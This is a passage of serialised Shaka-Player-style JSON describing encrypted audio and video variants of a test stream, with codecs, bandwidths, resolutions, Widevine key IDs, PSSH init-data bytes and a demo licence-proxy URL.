\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":524095,\"width\":854,\"height\":364,\"encrypted\":true,\"keyId\":\"517453862d4256fd8bad4f58422004d7\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":659607,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"517453862d4256fd8bad4f58422004d7\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\",\"517453862d4256fd8bad4f58422004d7\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":39,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":21,\"originalId\":\"18\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":689743,\"width\":1024,\"height\":436,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":825255,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":40,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":22,\"originalId\":\"21\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":2109936,\"width\":1920,\"height\":818,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":2245448,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":41,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":23,\"originalId\":\"23\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":1130335,\"width\":1280,\"height\":546,\"encrypted\":true,\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":1265847,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"f0937e9a77c855f0a6d43864c5d9f365\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\",\"f0937e9a77c855f0a6d43864c5d9f365\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":45,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":27,\"originalId\":\"26\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":4494687,\"width\":2560,\"height\":1090,\"encrypted\":true,\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":4630199,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\